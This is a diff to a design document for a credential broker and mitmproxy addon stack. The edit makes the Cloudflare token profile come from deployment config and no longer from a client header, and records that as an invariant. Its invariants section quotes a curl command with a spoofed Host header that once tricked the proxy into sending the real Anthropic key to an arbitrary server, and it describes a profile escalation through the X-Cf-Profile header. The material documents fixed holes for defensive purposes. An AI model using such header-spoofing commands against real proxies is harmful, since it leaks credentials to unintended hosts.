@@ -67,7 +67,7 @@ Route handlers live in `stack/broker/providers/` — one file per credential pro
 | `/github/credential` | cred-gateway → lab git helper | Same token in `git credential` format |
 | `/github/identity` | cred-gateway → setup-start.sh | App name+email for `git config`, lifetime-cached |
 | `/anthropic/cred` | proxy `020_anthropic.py` | Returns `{type, value}`; prefers `ANTHROPIC_AUTH_TOKEN_PATH` (OAuth) over `ANTHROPIC_API_KEY_PATH`, read fresh on each uncached call |
-| `/cloudflare/token?profile=` | proxy `030_cloudflare.py` | Mints scoped token via Cloudflare API, cached per profile |
+| `/cloudflare/token?profile=` | proxy `030_cloudflare.py` | Mints scoped token via Cloudflare API, cached per profile. The `profile` param is a cross-check against the broker's own `CLOUDFLARE_PROFILE`, not an input — a mismatch is a 403 |
 | `/healthz` | Docker healthcheck | |
 
 The broker makes direct outbound HTTPS calls to `api.github.com` and `api.cloudflare.com` — it does **not** go through the proxy. Routing through the proxy would be circular (proxy fetches creds from broker to authenticate outbound calls).
@@ -81,7 +81,7 @@ mitmproxy with addons in `stack/proxy/addons/`, bind-mounted into the container 
 - **`000_policy.py`** — blocks any request destined for `broker` or `cred-gateway` hostnames (defense-in-depth; Docker network isolation is the primary control). Must load first.
 - **`010_github.py`** — matches `api.github.com` and `uploads.github.com` only. Fetches token from broker, injects as `Authorization: token ...`. Strips whatever the client sent. **Does not match `github.com`** — git push/pull goes through the credential helper path, not here.
 - **`020_anthropic.py`** — matches `api.anthropic.com`. Injects the API key. Blocks `/v1/organizations/*` (Admin API). Uses `responseheaders` hook + `flow.response.stream = True` for SSE to avoid buffering streamed responses.
-- **`030_cloudflare.py`** — matches `api.cloudflare.com`. Injects a scoped token. Caller can hint a profile via `X-Cf-Profile` header (stripped before forwarding); defaults to `workers-deploy`.
+- **`030_cloudflare.py`** — matches `api.cloudflare.com`. Injects a scoped token. Which profile comes from `CLOUDFLARE_PROFILE` on the proxy service (default `workers-deploy`); `X-Cf-Profile` is stripped and discarded, never read.
 
 All addons cache credentials with a 5-minute TTL (`cachetools.TTLCache`). A 401 from GitHub clears the cache immediately.
 
@@ -133,6 +133,8 @@ Runs as root, unlike every other service in this stack. That's deliberate here, 
 ## Non-obvious invariants
 
 **Never use `flow.request.pretty_host` for a security decision in an addon** — see `PLAYBOOK.md`'s generation constraints for the rule (match `flow.request.host` instead). Concretely, every addon originally matched `pretty_host`, which meant `curl --proxy http://proxy:8080 -H 'Host: api.anthropic.com' http://my-server/` made the proxy inject the real Anthropic key into a request delivered to `my-server`, and `-H 'Host: anything'` walked `000_policy.py` straight through to `broker:8080/github/token`. `tests/integration/20`, `25` and `30` cover each addon against regressing on this.
+
+**Which credential an addon attaches is deployment config, never request data** — see `PLAYBOOK.md`'s generation constraints for the rule. `030_cloudflare.py` shipped the counter-example until 1.6.0: `X-Cf-Profile` selected the profile, so a `dev`/`qa`/`prod-ir` ladder was decorative and the audit line recorded the escalated profile as authorised. `CLOUDFLARE_PROFILE` on the proxy service replaces it, the broker rejects any other profile as defense-in-depth, and `header_selector` in `scripts/lib/invariants.sh` catches the next addon that reaches for the same shortcut. Stripping a client header is not reading it — a bare `pop()`/`del` is correct and does not trip the check.
 
 **`GH_TOKEN=proxy-injected` and `CLOUDFLARE_API_TOKEN=proxy-injected` are dummy values, never real ones** — see `PLAYBOOK.md`'s Known Providers / generation constraints for why.
 
